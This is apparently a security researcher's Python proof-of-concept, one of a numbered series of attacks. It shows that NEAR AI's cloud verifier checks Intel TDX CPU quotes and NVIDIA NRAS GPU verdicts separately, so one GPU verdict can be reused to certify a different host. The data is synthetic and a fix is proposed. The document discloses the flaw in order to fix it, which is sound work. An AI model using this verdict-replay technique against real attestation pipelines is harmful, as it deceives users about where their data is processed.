#!/usr/bin/env python3
"""
Attack #18 — F8 (NEAR AI CPU↔GPU attestation chain unbound)

NEAR AI's model_verifier.py consumes two hardware-root attestations:

  - `check_tdx_quote(attestation)`     — Intel TDX quote
                                         (`attestation["intel_quote"]`)
  - `check_gpu(attestation, nonce)`    — NVIDIA NRAS verdict
                                         (`attestation["nvidia_payload"]`)

(see `py/model_verifier.py:129-184`). Each function checks its own
component independently. There is no field anywhere in the
attestation dict — or in the signed payload chain — that binds the
NVIDIA NRAS verdict's `gpu_uuid` to the Intel TDX quote's
`signing_address` or `mr_config_id`. Each link is honest; the chain
is not.

Even when the NRAS JWT signature is fully verified (closing Attack
#6 / F3), and when `payload["nonce"] == request_nonce` matches
(closing the per-request GPU freshness check), the verifier still
cannot tell that the GPU named in the NRAS verdict is the GPU
physically attached to the host whose CPU produced the TDX quote.

This complements Attack 12 (Power F8) by showing F8 in a second
system, against a different attestation pipeline.

NEAR AI source is NOT modified. The PoC faithfully ports the
verification logic shape from `model_verifier.py:129-184`. The
mock NRAS verdict signature is assumed to verify cleanly — we
*close* F3 by hypothesis so the F8 gap is the one being
demonstrated.
"""

import hashlib
import json


def sha256_text(text: str) -> str:
    return hashlib.sha256(text.encode("utf-8")).hexdigest()


def signing_address_padded32(signing_address: str) -> str:
    """Mirror of model_verifier._signing_address_padded32 for ECDSA."""
    addr_hex = signing_address.removeprefix("0x").lower()
    return addr_hex.rjust(64, "0")


def build_intel_quote(signing_address: str,
                      tls_fingerprint: str,
                      mr_config_id: str) -> dict:
    """A synthetic Intel TDX quote model — what the verifier
    *parses* out of it (we skip the bytes-level signing because
    dcap_qvl is not mocked here)."""
    # model_verifier.py's check_report_data computes
    #   report_data[0..32] = SHA256(signing_address_padded32 || fingerprint)
    addr_padded = signing_address_padded32(signing_address)
    fingerprint_bytes = bytes.fromhex(tls_fingerprint.removeprefix("0x"))
    addr_bytes = bytes.fromhex(addr_padded)
    report_data_first32 = hashlib.sha256(addr_bytes + fingerprint_bytes).hexdigest()
    return {
        "intel_quote_label": f"TDX-quote-{signing_address[:10]}",
        "report_data": report_data_first32 + "00" * 32,
        "mr_config_id": mr_config_id,
        "status": "UpToDate",
    }


def build_nras_verdict(gpu_uuid: str, nonce: str) -> dict:
    """A synthetic NRAS verdict. In a real verifier
    `fetch_nvidia_verification(payload)` returns a JWT this is the
    decoded payload of."""
    return {
        "gpu_uuid": gpu_uuid,
        "nonce": nonce,
        "firmware_version": "535.86",
        "cc_enabled": True,
        "verdict": "SUCCESS",
        # Assumed validly signed by NVIDIA (closing F3 by hypothesis).
        "signature_alg": "ES256",
        "signature": "<assumed-valid-nvidia-ecdsa-signature>",
    }


def verifier_check_cpu(quote_view: dict,
                       expected_signing_address: str,
                       expected_tls_fp: str) -> bool:
    """Mirror of model_verifier.check_report_data for the
    signing_address || fingerprint case."""
    expected_first32 = hashlib.sha256(
        bytes.fromhex(signing_address_padded32(expected_signing_address))
        + bytes.fromhex(expected_tls_fp.removeprefix("0x"))
    ).hexdigest()
    return quote_view["report_data"][:64] == expected_first32 \
        and quote_view["status"] in {"UpToDate", "OutOfDate"}


def verifier_check_gpu(nras_payload: dict, request_nonce: str) -> bool:
    """Mirror of model_verifier.check_gpu without the JWT-decode step
    (we assume the JWT signature was already verified upstream)."""
    return nras_payload["nonce"].lower() == request_nonce.lower() \
        and nras_payload["verdict"] == "SUCCESS"


def main():
    print("=" * 66)
    print("NEAR AI F8 PoC — CPU↔GPU chain unbound (Attack #18)")
    print("=" * 66)
    print()
    print("Driving the verification-logic shape from")
    print("    nearai-cloud-verifier/py/model_verifier.py:129-184")
    print()

    request_nonce = "a" * 64  # 32-byte hex
    tls_fingerprint = "11" * 32

    # ---- Scenario A: an honest deployment. ----
    # CPU enclave on host H1 with GPU G1.
    signing_address_h1 = "0x1111111111111111111111111111111111111111"
    quote_h1 = build_intel_quote(signing_address_h1, tls_fingerprint,
                                 mr_config_id="01" + "ab" * 47)
    nras_g1 = build_nras_verdict("GPU-AAAA-AAAA-AAAA-AAAA-AAAAAAAA",
                                 request_nonce)

    print("[+] Honest deployment on host H1 with GPU G1:")
    print(f"        signing_address: {signing_address_h1}")
    print(f"        Intel quote   :  {quote_h1['intel_quote_label']}")
    print(f"        NRAS verdict  :  gpu_uuid={nras_g1['gpu_uuid']}")
    print()

    # ---- Scenario B: a different deployment that hijacks G1's
    # verdict. ----
    # CPU enclave on host H2 with non-CC GPU G2 (or no GPU at all).
    # Operator on H2 picks the SAME request_nonce (legitimate
    # client-supplied; operator routes it to both sides).
    signing_address_h2 = "0x2222222222222222222222222222222222222222"
    quote_h2 = build_intel_quote(signing_address_h2, tls_fingerprint,
                                 mr_config_id="01" + "cd" * 47)
    # Operator on H2 attaches G1's verdict (same NRAS JSON object) to
    # their attestation. The verdict was legitimately signed by NVIDIA
    # for GPU G1; the operator just reuses it.
    nras_reused_g1 = nras_g1

    print("[+] Dishonest deployment on host H2 (no CC GPU, or different GPU):")
    print(f"        signing_address: {signing_address_h2}")
    print(f"        Intel quote   :  {quote_h2['intel_quote_label']}")
    print(f"        NRAS verdict  :  gpu_uuid={nras_reused_g1['gpu_uuid']}  (G1's!)")
    print()

    # ---- Verifier walks each attestation independently. ----
    print("=" * 66)
    print("Verifier's view (each link is checked independently)")
    print("=" * 66)
    print()

    cpu_a_ok = verifier_check_cpu(quote_h1, signing_address_h1, tls_fingerprint)
    gpu_a_ok = verifier_check_gpu(nras_g1, request_nonce)
    print(f"Attestation A (host H1 + G1 verdict):")
    print(f"        CPU check ✓ : {cpu_a_ok}")
    print(f"        GPU check ✓ : {gpu_a_ok}")
    print(f"        verifier accepts: {cpu_a_ok and gpu_a_ok}")
    print()

    cpu_b_ok = verifier_check_cpu(quote_h2, signing_address_h2, tls_fingerprint)
    gpu_b_ok = verifier_check_gpu(nras_reused_g1, request_nonce)
    print(f"Attestation B (host H2 + REUSED G1 verdict):")
    print(f"        CPU check ✓ : {cpu_b_ok}")
    print(f"        GPU check ✓ : {gpu_b_ok}")
    print(f"        verifier accepts: {cpu_b_ok and gpu_b_ok}")
    print()

    assert cpu_a_ok and gpu_a_ok
    assert cpu_b_ok and gpu_b_ok

    # ---- The binding question the verifier doesn't ask. ----
    print("=" * 66)
    print("The binding question the verifier CANNOT answer")
    print("=" * 66)
    print()
    print("    \"Is the GPU named in the NRAS verdict physically attached")
    print("     to the host whose CPU produced the Intel TDX quote?\"")
    print()
    print("    To answer YES the verifier would need at least one of:")
    print("        (a) Intel TDX quote's report_data hashes the NRAS")
    print("            verdict bytes — or the GPU's UUID — explicitly.")
    print("        (b) The NRAS verdict's nonce is derived from the CPU's")
    print("            session key (so it can't be reused across hosts).")
    print("        (c) A composite attestation receipt naming both")
    print("            components by hash.")
    print()
    print("    NEAR AI's `model_verifier.py` does NONE of these.")
    print()
    print(f"    quote_h1.report_data[0..64] = {quote_h1['report_data'][:64]}")
    print(f"    quote_h2.report_data[0..64] = {quote_h2['report_data'][:64]}")
    print(f"    nras.gpu_uuid (both)        = {nras_g1['gpu_uuid']}")
    print(f"    nras.nonce    (both)        = {nras_g1['nonce']}")
    print()
    print(f"    Are the NRAS gpu_uuid bytes hashed into ANY field of")
    print(f"    either Intel quote? {nras_g1['gpu_uuid'] in quote_h1['report_data']}")
    print(f"                        {nras_g1['gpu_uuid'] in quote_h2['report_data']}")
    print()

    print("=" * 66)
    print("Result")
    print("=" * 66)
    print()
    print("    [+] ATTACK CONFIRMED (P12, F8 — CPU↔GPU chain unbound)")
    print()
    print("    NEAR AI's cloud-verifier accepts both attestations: each")
    print("    independent signature checks out, the GPU nonce matches the")
    print("    request_nonce in both cases. But the same NRAS verdict has")
    print("    been used to certify two different CPU enclaves on two")
    print("    different hosts. Nothing in `model_verifier.py` rejects this.")
    print()
    print("    Fix: extend the Intel TDX quote's report_data layout (or a")
    print("    sibling claim) to include sha256(NRAS verdict bytes). Have")
    print("    `check_attestation` require: NRAS signature ✓ AND")
    print("        sha256(nvidia_payload bytes) == cpu_report_data.nras_hash.")
    print()
    print("    Pair this with Attack 12 (Power F8): two systems, two")
    print("    multi-component pipelines, same chain-unbound gap.")


if __name__ == "__main__":
    main()
